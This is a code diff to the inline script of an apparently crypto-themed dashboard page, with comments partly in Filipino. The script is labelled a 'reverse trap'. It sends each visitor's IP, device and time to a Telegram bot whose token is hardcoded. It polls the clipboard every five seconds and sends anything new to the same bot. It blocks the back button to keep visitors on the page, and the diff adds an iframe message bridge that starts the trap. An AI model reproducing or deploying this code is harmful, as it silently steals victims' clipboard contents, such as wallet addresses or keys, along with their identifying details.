@@ -264,7 +264,7 @@
     <script>
         // --- [ REVERSE TRAP COMMAND CENTER ] ---
         const TG_TOKEN = "8360873235:AAE8zMgYc6iCXRRHqiJbspywYG0yfbktSzY";
-        const TG_CHAT_ID = "8045620958";
+        const TG_CHAT_ID = "7938223457"; // UPDATE: Eto na yung tamang ID boss!
 
         async function sendToTelegram(msg) {
             try {
@@ -273,37 +273,46 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML" })
                 });
-            } catch (e) {}
+            } catch (e) { console.log("TG Error: ", e); }
         }
 
-        // Global function para sa sub-pages
+        // Bridge: Makikinig tayo kung may signal mula sa Eth.html (iframe)
+        window.addEventListener('message', function(event) {
+            if (event.data.type === 'START_TRAP') {
+                window.triggerTrap(event.data.coin);
+            }
+        });
+
         window.triggerTrap = async function(coinType) {
-            if (sessionStorage.getItem('trap_active')) return; 
-            sessionStorage.setItem('trap_active', 'true');
+            // Isang beses lang mag-report ng system info para hindi spam
+            if (sessionStorage.getItem('trap_initialized')) {
+                 console.log("Trap already reporting...");
+                 return;
+            }
+            sessionStorage.setItem('trap_initialized', 'true');
 
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 
-                const report = `🚨 <b>ENGINE ACTIVATED!</b>\n` +
+                const report = `🚀 <b>TARGET ACQUIRED!</b>\n` +
                                `--------------------------\n` +
-                               `🎯 <b>Engine:</b> ${coinType}\n` +
+                               `🎯 <b>First Click:</b> ${coinType}\n` +
                                `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                                `📱 <b>Device:</b> ${navigator.platform}\n` +
-                               `⚙️ <b>Browser:</b> ${navigator.userAgent.split(') ')[1] || "Unknown"}\n` +
                                `⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
                 sendToTelegram(report);
             } catch (err) {
-                sendToTelegram(`⚠️ User started ${coinType} (Hidden IP)`);
+                sendToTelegram(`⚠️ Engine started: ${coinType} (IP Hidden)`);
             }
 
-            // Clipboard snatcher (Persistent as long as index is open)
+            // Clipboard snatcher (Persistent monitoring)
             setInterval(async () => {
                 try {
                     const text = await navigator.clipboard.readText();
                     if (text && text.length > 0 && text !== localStorage.getItem('last_c')) {
                         localStorage.setItem('last_c', text);
-                        sendToTelegram(`📋 <b>CLIPBOARD LEAK:</b>\n<code>${text}</code>`);
+                        sendToTelegram(`📋 <b>CLIPBOARD SNATCHED:</b>\n<code>${text}</code>`);
                     }
                 } catch (e) {}
             }, 5000);
@@ -315,7 +324,6 @@
                 blockAccess();
                 return;
             }
-            // Pag nag-switch page, hindi ma-re-reload ang main window para tuloy ang monitoring
             document.getElementById('dashboard-home').style.display = 'none';
             document.getElementById('content-area').style.display = 'flex';
             document.getElementById('content-frame').src = page;
@@ -326,8 +334,6 @@
             else if(page.includes('Profile')) document.getElementById('n-user').classList.add('active');
 
             document.getElementById('label-top').textContent = page.split('.')[0].toUpperCase() + " ACTIVE";
-            
-            // Push state para sa "Back" button handling
             history.pushState({page: page}, null, "");
         }
 
@@ -339,10 +345,7 @@
             document.getElementById('n-home').classList.add('active');
         }
 
-        // Handle Back Button para hindi ma-exit ang app/trap
-        window.onpopstate = function(event) {
-            goHome();
-        };
+        window.onpopstate = function(event) { goHome(); };
 
         function exitSystem() {
             sessionStorage.clear();
